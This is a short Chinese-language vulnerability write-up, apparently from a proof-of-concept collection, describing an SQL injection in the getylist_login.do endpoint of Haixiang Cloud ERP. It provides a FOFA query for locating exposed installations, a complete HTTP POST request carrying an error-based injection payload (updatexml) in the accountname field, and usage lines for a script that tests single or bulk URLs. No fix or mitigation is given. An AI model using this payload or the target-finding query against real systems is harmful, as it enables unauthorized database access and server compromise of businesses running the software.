# 海翔ERP getylist_login.do SQL注入漏洞

### 1.漏洞描述

海翔云ERP,由成都海翔软件有限公司自主研发，拥有完全知识产权。 云ERP为企业提供 营销 + 财务 + 仓储 + 物流 整体解决方案;云ERP致力于在互联网背景下，为商贸公司提供企业级整体应用解决方案;云ERP更注重提供丰富的移动端应用，推动企业在互联网时代的经营升级

海翔云ERP getylist_login 接口处存在SQL注入漏洞，恶意攻击者可能会利用该漏洞获取服务器敏感信息，最终导致服务器失陷。

### 2.fofa语法

```
body="checkMacWaitingSecond"
```

### 3.漏洞复现

```
POST /getylist_login.do HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
 
accountname=test' and (updatexml(1,concat(0x7e,(select md5(123456)),0x7e),1));--
```

![image.png](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719832101346-4f28a7a2-3059-4b10-b63c-fd4b2073f5a4.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_937%2Climit_0)

### 4.py脚本使用

```
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```

